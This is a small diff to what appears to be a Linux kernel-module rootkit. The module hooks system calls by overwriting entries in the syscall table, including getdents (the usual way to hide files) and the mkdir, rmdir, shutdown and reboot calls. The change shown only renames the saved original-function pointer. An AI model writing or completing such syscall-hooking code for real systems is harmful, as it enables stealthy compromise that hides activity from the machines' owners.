@@ -37,7 +37,7 @@ struct linux_dirent {
 asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
 	int boff;
 	struct linux_dirent* ent;
-	long ret = sys_getdents_orig(fd, dirent, count);
+	long ret = orig_getdents(fd, dirent, count);
 	char* dbuf;
 	if (ret <= 0) {
 		return ret;
@@ -135,7 +135,7 @@ static int __init start(void)
     orig_shutdown = (orig_shutdown_t)sys_call_addr[__NR_shutdown];
     orig_mkdir=(orig_mkdir_t)sys_call_addr[__NR_mkdir];
     old_reboot_sys_call=sys_call_addr[__NR_reboot];
-    orig_getdents = (orig_sys_getdents_t)sys_call_addr[__NR_getdents];
+    orig_getdents = (orig_getdents_t)sys_call_addr[__NR_getdents];
     printk("Project:Module: Loaded \n");
     printk("Project:rmdir @ 0x%lx\n", orig_rmdir);
     printk("Project:rmdir @ 0x%lx\n", orig_mkdir);
